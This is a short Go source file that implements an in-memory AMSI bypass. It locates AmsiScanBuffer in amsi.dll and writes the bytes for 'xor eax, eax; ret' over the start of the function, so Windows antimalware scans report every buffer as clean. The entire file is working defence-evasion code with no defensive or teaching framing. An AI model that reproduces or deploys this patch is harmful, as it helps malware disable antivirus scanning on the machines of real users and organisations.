package amsi_etw

import (
"syscall"
"unsafe"
)

type InprocessPatch struct{}

func NewInprocessPatch() *InprocessPatch {
return &InprocessPatch{}
}

func (i *InprocessPatch) PatchAmsi() error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procGetProcAddress := kernel32.NewProc("GetProcAddress")
procGetModuleHandle := kernel32.NewProc("GetModuleHandleW")

amsiModule, _ := syscall.UTF16PtrFromString("amsi.dll")
moduleHandle, _, _ := procGetModuleHandle.Call(uintptr(unsafe.Pointer(amsiModule)))

funcName, _ := syscall.UTF16PtrFromString("AmsiScanBuffer")
funcAddr, _, _ := procGetProcAddress.Call(moduleHandle, uintptr(unsafe.Pointer(funcName)))

if funcAddr != 0 {
// Patch function to return AMSI_RESULT_CLEAN (0)
// XOR eax, eax (0x31 0xC0) then ret (0xC3)
patch := []byte{0x31, 0xC0, 0xC3}
for i, b := range patch {
*(*byte)(unsafe.Pointer(funcAddr + uintptr(i))) = b
}
}
return nil
}
